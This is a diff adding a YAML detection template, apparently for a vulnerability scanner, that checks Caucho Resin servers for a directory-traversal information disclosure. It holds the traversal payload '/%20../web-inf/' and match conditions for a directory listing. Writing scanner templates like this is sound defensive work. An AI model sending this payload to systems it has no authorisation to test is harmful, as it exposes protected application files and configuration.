@@ -1,0 +1,25 @@
+id: resin-cnnvd-200705-315
+brief:
+    title: Caucho Resin Information Disclosure
+    by: princechaddha
+    level: high
+    about: Sensitive info disclosed in Caucho Resin.
+    label:
+        - resin
+        - caucho
+        - lfr
+        - vuln
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/%20../web-inf/'
+      signs:
+        - "on": status
+          status:
+            - 200
+        - "on": word
+          has:
+            - / ../web-inf/
+            - Directory of /
+          in: body
+          need: all
